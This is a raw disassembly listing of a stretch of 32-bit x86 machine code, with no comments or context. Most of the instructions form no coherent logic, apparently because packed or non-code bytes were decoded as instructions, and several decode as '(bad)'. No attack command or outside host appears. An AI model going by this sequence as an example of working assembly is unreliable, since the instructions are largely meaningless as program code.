  424a69:	pop    ebp
  424a6a:	push   0xcf35869f
  424a6f:	jl     0x424a1e
  424a71:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424a77:	leave  
  424a78:	jbe    0x424abf
  424a7a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424a80:	shr    al,1
  424a82:	lahf   
  424a83:	xchg   BYTE PTR ds:0xc955760a,dh
  424a89:	jbe    0x424af8
  424a8b:	dec    ecx
  424a8c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424a92:	xchg   esp,eax
  424a93:	iret   
  424a94:	inc    ebp
  424a95:	shl    ebx,cl
  424a97:	xchg   edx,eax
  424a98:	adc    bh,bl
  424a9a:	scas   eax,DWORD PTR es:[edi]
  424a9b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424aa1:	lea    esi,[eax+eax*1+0x0]
  424aa5:	add    BYTE PTR [esi+0x4],ch
  424aa8:	cli    
  424aa9:	xchg   BYTE PTR [edx-0x6047a019],al
  424aaf:	xchg   BYTE PTR ds:0x94060a,dh
  424ab5:	add    BYTE PTR [eax],al
  424ab7:	or     al,BYTE PTR [esi]
  424ab9:	mov    esp,0xa000000
  424abe:	jbe    0x424a70
  424ac0:	or     dh,BYTE PTR [esi+0x15]
  424ac3:	iret   
  424ac4:	outs   dx,BYTE PTR ds:[esi]
  424ac5:	std    
  424ac6:	iret   
  424ac7:	jno    0x424b39
  424ac9:	or     dh,BYTE PTR [esi+0x2d]
  424acc:	or     dh,BYTE PTR [esi+0x35]
  424acf:	leave  
  424ad0:	push   es
  424ad1:	jo     0x424ad3
  424ad3:	add    BYTE PTR [eax],al
  424ad5:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424adb:	pushf  
  424adc:	add    BYTE PTR [eax],al
  424ade:	add    BYTE PTR [edx],cl
  424ae0:	pop    ss
  424ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ae2:	add    BYTE PTR [eax],al
  424ae4:	add    cl,cl
  424ae6:	push   es
  424ae7:	lods   al,BYTE PTR ds:[esi]
  424ae8:	add    BYTE PTR [eax],al
  424aea:	add    BYTE PTR [edx-0x61],cl
  424aed:	xchg   BYTE PTR ds:0xb406c9,dh
  424af3:	add    BYTE PTR [eax],al
  424af5:	sbb    BYTE PTR [edi+0x6c93586],bl
  424afb:	les    eax,FWORD PTR [eax]
  424afd:	add    BYTE PTR [eax],al
  424aff:	popa   
  424b00:	lahf   
  424b01:	xchg   BYTE PTR ds:0x9006c9,dh
  424b07:	add    BYTE PTR [eax],al
  424b09:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b0f:	aam    0x0
  424b11:	add    BYTE PTR [eax],al
  424b13:	call   0xa77d1b7
  424b18:	iret   
  424b19:	fadd   QWORD PTR [eax]
  424b1b:	add    BYTE PTR [eax],al
  424b1d:	leave  
  424b1e:	push   es
  424b1f:	in     al,0x0
  424b21:	add    BYTE PTR [eax],al
  424b23:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424b29:	add    ecx,ecx
  424b2b:	jbe    0x424b32
  424b2d:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424b33:	or     ecx,ecx
  424b35:	jbe    0x424b03
  424b37:	inc    ecx
  424b38:	lahf   
  424b39:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424b3f:	jbe    0x424b66
  424b41:	pusha  
  424b42:	lahf   
  424b43:	xchg   BYTE PTR ds:0x493d76c9,dh
  424b49:	and    DWORD PTR [esi-0x3292c4cb],eax
  424b4f:	int3   
  424b50:	push   es
  424b51:	jo     0x424b53
  424b53:	add    BYTE PTR [eax],al
  424b55:	shr    ebx,cl
  424b57:	xchg   edx,eax
  424b58:	add    DWORD PTR [edx],eax
  424b5a:	scas   eax,DWORD PTR es:[edi]
  424b5b:	or     esp,ecx
  424b5d:	test   DWORD PTR [eax+eax*1+0x0],eax
  424b61:	add    BYTE PTR [esp+eax*1-0x7],ch
  424b65:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424b6b:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424b75:	add    BYTE PTR [eax-0x7c],dh
  424b78:	int    0xb3
  424b7a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424b80:	inc    esp
  424b81:	add    BYTE PTR [eax],al
  424b83:	add    BYTE PTR [edx+0x70],ah
  424b86:	add    BYTE PTR [ecx-0x78],dh
  424b89:	or     dh,BYTE PTR [esi+0x7d]
  424b8c:	iret   
  424b8d:	jbe    0x424b4c
  424b8f:	jo     0x424b5e
  424b91:	or     BYTE PTR ds:0x808081,ah
  424b97:	push   eax
  424b98:	int    0x76
  424b9a:	jge    0x424b9c
  424b9c:	icebp  
  424b9d:	int    0x76
  424b9f:	std    
  424ba0:	int    0x8d
  424ba2:	std    
  424ba3:	cmp    edi,DWORD PTR [ecx+0x4]
  424ba6:	add    bh,bh
  424ba8:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424bae:	push   ebx
  424baf:	ror    DWORD PTR [edx],cl
  424bb1:	jbe    0x424bc0
  424bb3:	int    0x8d
  424bb5:	std    
  424bb6:	int    0x76
  424bb8:	std    
  424bb9:	cmp    ecx,DWORD PTR [edi]
  424bbb:	add    al,0x11
  424bbd:	call   ebx
  424bbf:	lods   eax,DWORD PTR ds:[esi]
  424bc0:	sub    bl,dl
  424bc2:	jmp    0x424b56
  424bc4:	push   ebx
  424bc5:	jge    0x424b94
  424bc7:	jbe    0x424b86
  424bc9:	inc    ebx
  424bca:	rcl    esp,cl
  424bcc:	xchg   esi,eax
  424bcd:	or     dh,BYTE PTR [esi+0x75]
  424bd0:	in     al,dx
  424bd1:	das    
  424bd2:	int    0x80
  424bd4:	int    0x8d
  424bd6:	jne    0x424be2
  424bd8:	jbe    0x424b97
  424bda:	int    0x76
  424bdc:	mov    ebp,0x4dd4d343
  424be1:	int    0x70
  424be3:	sbb    al,0xcd
  424be5:	mov    bl,0x25
  424be7:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424bf1:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424bfb:	int    0xb3
  424bfd:	sub    eax,0xcd808081
  424c02:	xchg   esi,eax
  424c03:	dec    esp
  424c04:	int    0x62
  424c06:	cmp    al,0x87
  424c08:	xor    DWORD PTR [edx],ecx
  424c0a:	jo     0x424c30
  424c0c:	int    0x76
  424c0e:	stc    
  424c0f:	int    0x8d
  424c11:	stc    
  424c12:	cmp    edi,DWORD PTR [ecx+0x4]
  424c15:	add    bh,bh
  424c17:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c1d:	push   ebx
  424c1e:	ror    DWORD PTR [edx],cl
  424c20:	jbe    0x424c2f
  424c22:	int    0x96
  424c24:	and    al,0x9a
  424c26:	pop    ebx
  424c27:	mov    ebp,0xf5e2
  424c2c:	push   es
  424c2d:	ins    DWORD PTR es:[edi],dx
  424c2e:	das    
  424c2f:	add    eax,0x80808099
  424c34:	add    dh,dl
  424c36:	and    al,0xcd
  424c38:	lock pop ebx
  424c3a:	mov    ebp,0xf52c
  424c3f:	push   es
  424c40:	ins    DWORD PTR es:[edi],dx
  424c41:	das    
  424c42:	add    eax,0x808080c5
  424c47:	int    0x76
  424c49:	and    al,0xcd
  424c4b:	lock int 0xd5
  424c4e:	mov    ebp,0xfbe7
  424c53:	push   es
  424c54:	ins    DWORD PTR es:[edi],dx
  424c55:	das    
  424c56:	add    eax,0x808080d1
  424c5b:	call   0x0:0xf90ebd5b
  424c62:	push   es
  424c63:	ins    DWORD PTR es:[edi],dx
  424c64:	das    
  424c65:	add    eax,0x8080802d
  424c6a:	int    0x8
  424c6c:	and    eax,0x43808081
  424c71:	sbb    al,0xd6
  424c73:	sbb    cl,ch
  424c75:	or     BYTE PTR [ecx],dl
  424c77:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424c81:	int    0x8d
  424c83:	dec    esp
  424c84:	add    BYTE PTR [ecx+0x70005b94],dl
  424c8a:	and    al,0xcd
  424c8c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424c92:	or     ch,0x7d
  424c95:	cmp    ecx,DWORD PTR [edi]
  424c97:	add    al,0x11
  424c99:	call   ebx
  424c9b:	jmp    0x424c2f
  424c9d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424ca3:	(bad)
  424ca7:	dec    ecx
  424ca8:	and    BYTE PTR [esi-0x778932cb],al
  424cae:	int    0x8d
  424cb0:	mov    ch,cl
  424cb2:	jbe    0x424cd8
  424cb4:	shr    ebx,cl
  424cb6:	xchg   edx,eax
  424cb7:	adc    al,BYTE PTR [edx]
  424cb9:	scas   eax,DWORD PTR es:[edi]
  424cba:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424cc0:	sbb    ch,cl
  424cc2:	ins    BYTE PTR es:[edi],dx
  424cc3:	cmp    al,0xcd
  424cc5:	lea    ebp,[edi+eax*4]
  424cc8:	lds    ecx,FWORD PTR [edx]
  424cca:	outs   dx,BYTE PTR ds:[esi]
  424ccb:	adc    al,0xcd
  424ccd:	jbe    0x424cfb
  424ccf:	leave  
  424cd0:	add    BYTE PTR [edi-0x327f7f80],0x76
  424cd7:	sub    al,0xa
  424cd9:	pushf  
  424cda:	test   ch,cl
  424cdc:	jbe    0x424d0e
  424cde:	int    0x8d
  424ce0:	sub    al,0xa
  424ce2:	outs   dx,BYTE PTR ds:[esi]
  424ce3:	mov    ch,cl
  424ce5:	jbe    0x424cfb
  424ce7:	int    0x8d
  424ce9:	sub    al,0xa
  424ceb:	outs   dx,BYTE PTR ds:[esi]
  424cec:	dec    esp
  424ced:	in     al,dx
  424cee:	adc    al,0xcd
  424cf0:	jbe    0x424d16
  424cf2:	int    0x6c
  424cf4:	cmp    al,0xcd
  424cf6:	lea    ebp,[edi+eax*4]
  424cf9:	lds    ecx,FWORD PTR [edx]
  424cfb:	outs   dx,BYTE PTR ds:[esi]
  424cfc:	adc    al,0xcd
  424cfe:	jbe    0x424d2c
  424d00:	add    al,0x2c
  424d02:	or     cl,0x76
  424d05:	icebp  
  424d06:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424d10:	cmp    ebx,ebp
  424d12:	int    0xc5
  424d14:	arpl   sp,bp
  424d16:	xchg   edx,eax
  424d17:	cmp    ebp,DWORD PTR [ebp-0x56]
  424d1a:	test   al,0xcb
  424d1c:	shl    BYTE PTR [eax+eax*4],cl
  424d1f:	xchg   esi,eax
  424d20:	int    0xed
  424d22:	jno    0x424d95
  424d24:	das    
  424d25:	mov    ebx,0x74cf146e
  424d2a:	mov    BYTE PTR [edi+ebp*1],bl
  424d2d:	mov    ebx,0x9a5b867e
  424d32:	leave  
  424d33:	jbe    0x424d32
  424d35:	dec    ecx
  424d36:	and    DWORD PTR [esi-0x672f5cb],eax
  424d3c:	push   es
  424d3d:	retf   
  424d3e:	aam    0xb4
  424d40:	popa   
  424d41:	shl    DWORD PTR [ecx],1
  424d43:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424d49:	out    0x88,al
  424d4b:	xchg   edx,edi
  424d4d:	pop    esi
  424d4e:	out    0x4c,al
  424d50:	or     BYTE PTR [ebp-0x33],0xdc
  424d54:	mov    BYTE PTR [edi-0x77197806],al
  424d5a:	pop    esi
  424d5b:	out    0x4c,al
  424d5d:	cmp    BYTE PTR [edx-0x33],0x8d
  424d61:	std    
  424d62:	int    0xe6
  424d64:	std    
  424d65:	cmp    edx,DWORD PTR [ebx]
  424d67:	add    al,0xf8
  424d69:	call   ebx
  424d6b:	jmp    0xd41e1a98
  424d70:	in     al,dx
  424d71:	xchg   edx,eax
  424d72:	push   ebx
  424d73:	cld    
  424d74:	add    al,0xf2
  424d76:	std    
  424d77:	add    al,0xd3
  424d79:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424d80:	sub    BYTE PTR [ebx-0x6],dl
  424d83:	adc    bh,al
  424d85:	dec    ecx
  424d86:	and    DWORD PTR [esi-0x2197ecb],eax
  424d8c:	int    0x8d
  424d8e:	std    
  424d8f:	int    0xe6
  424d91:	std    
  424d92:	cmp    edx,DWORD PTR [ebx]
  424d94:	add    al,0xf8
  424d96:	call   ebx
  424d98:	jmp    0x424d2c
  424d9a:	shr    ecx,cl
  424d9c:	sub    BYTE PTR [ebx-0x10],dl
  424d9f:	inc    ebx
  424da0:	(bad)  
  424da1:	stc    
  424da2:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424da9:	ror    BYTE PTR [eax-0x12326980],cl
  424daf:	add    al,0xed
  424db1:	push   eax
  424db2:	leave  
  424db3:	jbe    0x424d5a
  424db5:	mov    edx,0xc98080ac
  424dba:	jbe    0x424d71
  424dbc:	xchg   eax,ecx
  424dbe:	add    BYTE PTR [eax-0x68528937],0x40
  424dc5:	add    BYTE PTR [eax-0x51068937],0x30
  424dcc:	test   BYTE PTR [eax-0x4a028937],al
  424dd2:	lods   al,BYTE PTR ds:[esi]
  424dd3:	add    BYTE PTR [eax+0x69f176c9],0x53
  424dda:	add    BYTE PTR [eax-0x76a8937],0x42
  424de1:	add    BYTE PTR [eax-0x78628937],0x80
  424de8:	add    BYTE PTR [eax-0x2c428937],0xb8
  424def:	add    BYTE PTR [eax-0x32128937],0x71
  424df6:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424dfd:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e04:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e0a:	(bad)  
  424e0b:	stc    
  424e0c:	cmp    ebx,edx
  424e0e:	clc    
  424e0f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424e15:	repnz popa 
  424e17:	and    al,BYTE PTR [eax-0x7a34ed80]
  424e1d:	mov    BYTE PTR [eax+0x42021280],0xa4
  424e24:	add    BYTE PTR [eax+0x3cded312],0x80
  424e2b:	or     cl,0x76
  424e2e:	cmc    
  424e2f:	icebp  
  424e30:	lea    eax,[eax-0x2893680]
  424e36:	jnp    0x424e0c
  424e38:	add    BYTE PTR [eax+0x18f976c9],0x30
  424e3f:	add    BYTE PTR [eax-0x32068933],0x96
  424e46:	std    
  424e47:	ss dec eax
  424e49:	pushf  
  424e4a:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424e51:	int    0xe3
  424e53:	push   esi
  424e54:	jp     0x424e55
  424e56:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424e5d:	int    0x76
  424e5f:	std    
  424e60:	xchg   DWORD PTR [esi-0x78],esi
  424e63:	int    0x96
  424e65:	std    
  424e66:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424e6c:	xor    ch,cl
  424e6e:	jbe    0x424e81
  424e70:	int    0x96
  424e72:	in     eax,dx
  424e73:	sbb    BYTE PTR ss:[edi-0x80],cl
  424e77:	cmp    BYTE PTR [ebx],0xd2
  424e7a:	int    0x96
  424e7c:	mov    ebp,0xe261d253
  424e81:	fadd   DWORD PTR [eax-0x320ecc80]
  424e87:	jbe    0x424e3e
  424e89:	xchg   DWORD PTR [ebx],edx
  424e8b:	popa   
  424e8c:	fist   WORD PTR [eax+eax*4-0x80]
  424e90:	xor    esi,ecx
  424e92:	xchg   DWORD PTR [esi-0x5a893253],edx
  424e98:	int    0xd6
  424e9a:	xor    ch,cl
  424e9c:	out    0x9d,al
  424e9e:	adc    bh,bl
  424ea0:	mov    DWORD PTR [ecx-0x80],esi
  424ea3:	sub    BYTE PTR [ebx],0xf1
  424ea6:	int    0x76
  424ea8:	xchg   ebp,eax
  424ea9:	adc    bh,bl
  424eab:	mov    dh,0x2c
  424ead:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424eb4:	clc    
  424eb5:	int    0x96
  424eb7:	icebp  
  424eb8:	push   esi
  424eb9:	out    0x1e,al
  424ebb:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424ec2:	icebp  
  424ec3:	adc    dh,bl
  424ec5:	pop    es
  424ec6:	push   edx
  424ec7:	add    BYTE PTR [eax+0x72f9943],0x63
  424ece:	add    BYTE PTR [eax],al
  424ed0:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424ed6:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424edd:	pop    ebx
  424ede:	cwde   
  424edf:	call   0x8043:0xd9ed76c9
  424ee6:	or     cl,0x76
  424ee9:	adc    DWORD PTR [edx+0x7e],esi
  424eec:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424ef3:	add    BYTE PTR [eax+0xbf976c9],0x71
  424efa:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f01:	add    BYTE PTR [eax-0x275a8937],0x58
  424f08:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f0f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424f16:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424f1d:	add    BYTE PTR [eax-0x449a8937],0x6f
  424f24:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424f2b:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424f32:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424f39:	add    BYTE PTR [eax-0x44f28937],0x4d
  424f40:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424f47:	add    BYTE PTR [eax-0x32528933],0x8d
  424f4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424f4f:	dec    ebp
  424f50:	bound  ebp,QWORD PTR [ebx]
  424f52:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424f59:	dec    ebp
  424f5a:	pop    ds
  424f5b:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424f61:	pop    edi
  424f62:	xchg   ecx,eax
  424f63:	mov    bh,0x7e
  424f65:	stc    
  424f66:	xor    edi,DWORD PTR [ebp-0x33]
  424f69:	jbe    0x424f68
  424f6b:	int    0x96
  424f6d:	stc    
  424f6e:	sub    edx,edx
  424f70:	int    0x96
  424f72:	cmc    
  424f73:	dec    ebp
  424f74:	inc    edi
  424f75:	outs   dx,DWORD PTR ds:[esi]
  424f76:	add    BYTE PTR [eax-0x69322dcd],0x11
  424f7d:	xor    edx,edx
  424f7f:	int    0x96
  424f81:	in     eax,dx
  424f82:	push   ebx
  424f83:	sar    BYTE PTR [ebx],cl
  424f85:	fisubr DWORD PTR [ecx-0x27]
  424f88:	ret    
  424f89:	add    BYTE PTR [eax],al
  424f8b:	clc    
  424f8c:	test   ebp,0x72c34c96
  424f92:	push   ds
  424f93:	add    BYTE PTR [eax+0x76cdf133],0xbd
  424f9a:	int    0xd6
  424f9c:	mov    ch,0x33
  424f9e:	leave  
  424f9f:	das    
  424fa0:	sar    DWORD PTR [ecx+0x69],1
  424fa3:	fisttp DWORD PTR [edx]
  424fa5:	xchg   ecx,eax
  424fa6:	mov    ebx,ebp
  424fa8:	popa   
  424fa9:	add    BYTE PTR [eax-0x6a893680],0x9b
  424fb0:	push   esp
  424fb1:	add    BYTE PTR [eax+0x2d9d76c9],0x6f
  424fb8:	add    BYTE PTR [eax+0x1ad76c9],0xa4
  424fbf:	add    BYTE PTR [eax-0x7e5a8937],0x80
  424fc6:	add    BYTE PTR [eax+0x3ba5a6cd],0xda
  424fcd:	pop    ebp
  424fce:	call   0xcdf4:0xf880806f
  424fd5:	xchg   esi,eax
  424fd6:	lods   eax,DWORD PTR ds:[esi]
  424fd7:	int    0xa6
  424fd9:	mov    BYTE PTR [ebx-0x2e],dl
  424fdc:	int    0x96
  424fde:	popf   
  424fdf:	xor    edx,edx
  424fe1:	int    0x96
  424fe3:	xchg   ebp,eax
  424fe4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  424fe6:	push   eax
  424fe7:	add    BYTE PTR [eax-0x302d2ed1],0x5
  424fee:	mov    BYTE PTR [eax+0x2c],bl
  424ff1:	ret    0xafd
  424ff4:	jbe    0x424f8b
  424ff6:	int    0x76
  424ff8:	icebp  
  424ff9:	int    0x96
  424ffb:	or     eax,0xf3f7f534
  425000:	int    0x96
  425002:	xchg   ebp,eax
  425003:	xor    al,0x23
  425005:	inc    esp
  425006:	test   DWORD PTR [ebp+edx*8-0x7c],ecx
  42500a:	inc    esi
  42500b:	or     DWORD PTR [eax+eiz*1+0x4d7d76cd],eax
  425012:	rol    esi,0x80
  425015:	add    BYTE PTR [edi-0x59328a8a],0x6d
  42501c:	cmp    ebx,edx
  42501e:	clc    
  42501f:	hlt    
  425020:	int    0x96
  425022:	gs mov edi,0xc3d9
  425028:	ss aaa 
  42502a:	push   esi
  42502b:	add    BYTE PTR [eax+0xc56d233],0x6d
  425032:	add    BYTE PTR [eax],al
  425034:	xchg   DWORD PTR [ebp-0x33],edi
  425037:	jbe    0x425036
  425039:	int    0x96
  42503b:	stc    
  42503c:	sub    edx,edx
  42503e:	int    0x96
  425040:	cmc    
  425041:	dec    ebp
  425042:	inc    edi
  425043:	outs   dx,DWORD PTR ds:[esi]
  425044:	add    BYTE PTR [eax-0x69322dcd],0x11
  42504b:	xor    edx,edx
  42504d:	int    0x96
  42504f:	in     eax,dx
  425050:	push   ebx
  425051:	sar    BYTE PTR [ebx],cl
  425053:	(bad)  
  425055:	hlt    
  425056:	int    0x96
  425058:	dec    esp
  425059:	xor    esi,ecx
  42505b:	int    0x76
  42505d:	mov    ebp,0x33b5a6cd
  425062:	leave  
  425063:	das    
  425064:	rol    ebp,1
  425066:	int    0xdb
  425068:	xor    ebx,DWORD PTR [ebp-0x1dbc5679]
  42506e:	das    
  42506f:	pop    es
  425070:	pop    esp
  425071:	add    BYTE PTR [eax],al
  425073:	add    BYTE PTR [edx-0x2d349c58],ch
  425079:	mov    BYTE PTR [eax+0x4edcd96],al
  42507f:	in     eax,dx
  425080:	jo     0x42504b
  425082:	jbe    0x425054
  425084:	xchg   ecx,eax
  425085:	aaa    
  425086:	ficom  WORD PTR [ebx]
  425088:	pop    ebp
  425089:	mov    ebp,0xa25230a
  42508e:	jbe    0x4250e5
  425090:	leave  
  425091:	jbe    0x4250f0
  425093:	mov    esi,0xa13de37
  425098:	jbe    0x4250ff
  42509a:	leave  
  42509b:	jbe    0x42510a
  42509d:	fidiv  WORD PTR [edi]
  42509f:	ficom  WORD PTR [ebx]
  4250a1:	or     dh,BYTE PTR [esi+0x75]
  4250a4:	pop    ebx
  4250a5:	leave  
  4250a6:	jbe    0x425125
  4250a8:	scas   al,BYTE PTR es:[edi]
  4250a9:	aaa    
  4250aa:	ficom  WORD PTR [ebx]
  4250ac:	or     dh,BYTE PTR [esi+0xd]
  4250af:	cwde   
  4250b0:	call   0xde37:0x96f176c9
  4250b7:	adc    ecx,DWORD PTR [edx]
  4250b9:	jbe    0x425050
  4250bb:	cmp    ebx,edx
  4250bd:	cmp    eax,DWORD PTR [eax]
  4250bf:	pop    edi
  4250c0:	dec    ecx
  4250c1:	and    DWORD PTR [esi-0x628936cb],eax
  4250c7:	out    0x37,al
  4250c9:	ficom  WORD PTR [ebx]
  4250cb:	jp     0x4250d7
  4250cd:	jbe    0x425074
  4250cf:	int    0xd3
  4250d1:	or     dl,BYTE PTR [esi-0x4a19f513]
  4250d7:	iret   
  4250d8:	xchg   ecx,eax
  4250d9:	add    DWORD PTR [ecx+edx*1],0x28add3ff
  4250e0:	push   ebx
  4250e1:	ror    bh,cl
  4250e3:	je     0x4250ac
  4250e5:	ror    ch,1
  4250e7:	xor    ch,cl
  4250e9:	pushf  
  4250ea:	test   BYTE PTR [edi],ch
  4250ec:	inc    ebp
  4250ed:	loop   0x425081
  4250ef:	shr    esp,cl
  4250f1:	xchg   edx,eax
  4250f2:	int    0x1c
  4250f4:	int    0x6c
  4250f6:	test   BYTE PTR [ebx],bh
  4250f8:	ins    DWORD PTR es:[edi],dx
  4250f9:	adc    bh,bl
  4250fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250fc:	mov    esi,0xf1534229
  425101:	or     dl,BYTE PTR [esi-0x6893207]
  425107:	xchg   DWORD PTR [ebp-0x2d],ebp
  42510a:	in     eax,0x28
  42510c:	inc    ebx
  42510d:	jbe    0x42515b
  42510f:	das    
  425110:	or     BYTE PTR [edi-0x327f7f80],bh
  425116:	jbe    0x425111
  425118:	add    al,0xb6
  42511a:	mov    ebp,0x11e60a80
  42511f:	int    0x76
  425121:	stc    
  425122:	push   es
  425123:	ins    DWORD PTR es:[edi],dx
  425124:	aam    0xb6
  425126:	cmp    ebp,DWORD PTR [ebp+0xa]
  425129:	out    0xf5,al
  42512b:	int    0x96
  42512d:	mov    ebp,0xcf88a6cd
  425132:	fs xor ch,cl
  425135:	xchg   esi,eax
  425136:	mov    BYTE PTR [edi-0x5269f527],al
  42513c:	retf   0x922
  42513f:	xchg   esi,eax
  425140:	add    ch,cl
  425142:	xchg   esi,eax
  425143:	stc    
  425144:	xchg   ecx,ebx
  425146:	retf   0x2014
  425149:	int    0xa6
  42514b:	lods   eax,DWORD PTR ds:[esi]
  42514c:	or     DWORD PTR [ebx],ebx
  42514e:	retf   0x96
  425151:	int    0xa6
  425153:	stc    
  425154:	xchg   ecx,esp
  425156:	int    0xe6
  425158:	mov    BYTE PTR [ecx],cl
  42515a:	adc    al,0x43
  42515c:	int    0x96
  42515e:	cmc    
  42515f:	ins    BYTE PTR es:[edi],dx
  425160:	add    al,0xea
  425162:	std    
  425163:	sar    DWORD PTR [ebp-0x7b2dfbd8],cl
  425169:	push   ebx
  42516a:	sar    BYTE PTR [ebx],cl
  42516c:	ror    DWORD PTR [edx],cl
  42516e:	jbe    0x425165
  425170:	push   ecx
  425171:	(bad)  
  425172:	cmc    
  425173:	int    0x96
  425175:	cmc    
  425176:	add    al,0x11
  425178:	call   ebx
  42517a:	repz xchg edx,eax
  42517c:	shr    DWORD PTR [ebp-0x322dacd8],cl
  425182:	xchg   esi,eax
  425183:	stc    
  425184:	inc    ebx
  425185:	rol    BYTE PTR [edx+0x7a003ba7],cl
  42518b:	int    0x76
  42518d:	adc    ebp,ecx
  42518f:	xchg   esi,eax
  425190:	stc    
  425191:	int    0xa6
  425193:	mov    ebp,0xcffdad04
  425198:	test   cl,dh
  42519a:	int    0x96
  42519c:	stc    
  42519d:	iret   
  42519e:	adc    al,0x5b
  4251a0:	int    0xa6
  4251a2:	dec    esp
  4251a3:	shl    ebx,cl
  4251a5:	sub    BYTE PTR [ebx-0x2e],dl
  4251a8:	cmp    edx,ebx
  4251aa:	or     dh,BYTE PTR [esi+0x11]
  4251ad:	push   ecx
  4251ae:	(bad)  
  4251af:	adc    ebp,ecx
  4251b1:	xchg   esi,eax
  4251b2:	adc    DWORD PTR [ecx+edx*1],eax
  4251b5:	call   ebx
  4251b7:	repz xchg edx,eax
  4251b9:	shr    DWORD PTR [ebp-0x322dacd8],cl
  4251bf:	xchg   esi,eax
  4251c0:	stc    
  4251c1:	xchg   edx,ebx
  4251c3:	xor    esp,edx
  4251c5:	or     dh,BYTE PTR [esi-0x43]
  4251c8:	inc    ebx
  4251c9:	lds    ebp,FWORD PTR [edi]
  4251cb:	pop    es
  4251cc:	outs   dx,DWORD PTR ds:[esi]
  4251cd:	add    BYTE PTR [eax],al
  4251cf:	add    ch,cl
  4251d1:	jbe    0x4251c0
  4251d3:	int    0x96
  4251d5:	mov    ch,0x4
  4251d7:	jmp    0xd384:0xd2046cfd
  4251de:	mov    ebp,0x3bd25328
  4251e3:	ror    ebp,cl
  4251e5:	popf   
  4251e6:	int    0xf1
  4251e8:	cmp    ebx,DWORD PTR [ecx-0x2c000bfc]
  4251ee:	in     eax,0x28
  4251f0:	or     dl,BYTE PTR [esi-0x6d0c2c4b]
  4251f6:	or     ah,BYTE PTR [esi-0x12697613]
  4251fc:	add    al,0xe6
  4251fe:	in     eax,dx
  4251ff:	xchg   BYTE PTR [edi],ch
  425201:	or     edx,DWORD PTR [ebp-0x55ffff01]
  425207:	test   al,0x63
  425209:	retf   
  42520a:	ror    BYTE PTR [eax-0x12326980],cl
  425210:	add    al,0xed
  425212:	adc    al,0xcd
  425214:	jbe    0x42519e
  425216:	leave  
  425217:	jbe    0x42522a
  425219:	dec    ecx
  42521a:	and    DWORD PTR [esi-0x28936cb],eax
  425220:	inc    ecx
  425221:	and    DWORD PTR [esi+0x5b80cd35],eax
  425227:	cwde   
  425228:	or     dh,BYTE PTR [esi-0x7]
  42522b:	leave  
  42522c:	jbe    0x425223
  42522e:	into   
  42522f:	and    DWORD PTR [esi+0x76c99a35],eax
  425235:	in     eax,dx
  425236:	inc    esi
  425237:	sbb    DWORD PTR [ebp-0x22932de],esi
  42523d:	int    0x8d
  42523f:	std    
  425240:	sar    bh,0x5d
  425243:	shl    DWORD PTR [ecx],1
  425245:	xchg   BYTE PTR ds:0xd3f03baa,dh
  42524b:	repnz sub BYTE PTR [ebx],bh
  42524e:	adc    ebx,edx
  425250:	out    dx,eax
  425251:	xchg   edx,eax
  425252:	push   ebx
  425253:	add    cl,ch
  425255:	lea    edx,[ecx]
  425257:	int    0x96
  425259:	adc    DWORD PTR [ebx],edi
  42525b:	jge    0x425298
  42525d:	(bad)  
  42525f:	jmp    0x4251f3
  425261:	shr    edx,cl
  425263:	sub    BYTE PTR [ebx+0x13],dl
  425266:	das    
  425267:	rol    DWORD PTR [edx],1
  425269:	jmp    0x42520a
  42526b:	add    BYTE PTR [eax-0x6723280],0xcd
  425272:	xchg   esi,eax
  425273:	stc    
  425274:	cmp    ebx,ecx
  425276:	shr    edx,cl
  425278:	sub    BYTE PTR [ebx],bh
  42527a:	jge    0x42524f
  42527c:	jmp    0x425210
  42527e:	push   ebx
  42527f:	adc    ecx,ebp
  425281:	xchg   esi,eax
  425282:	std    
  425283:	int    0xa6
  425285:	std    
  425286:	cmp    esi,ecx
  425288:	cmp    esp,ecx
  42528a:	shl    ebx,cl
  42528c:	xchg   edx,eax
  42528d:	shl    ebp,cl
